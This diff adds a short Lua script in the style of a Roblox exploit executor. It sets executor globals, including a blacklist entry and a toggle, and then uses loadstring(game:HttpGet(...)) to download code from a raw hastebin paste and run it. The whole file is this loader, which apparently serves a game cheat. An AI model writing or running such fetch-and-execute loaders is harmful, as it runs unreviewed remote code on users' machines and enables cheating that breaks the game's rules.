@@ -1,0 +1,4 @@
+getgenv().blacklistedlol = {"Cactus Juice"}
+_G.toggle = true
+
+loadstring(game:HttpGet("http://hastebin.com/raw/odisocokaj.md"))()
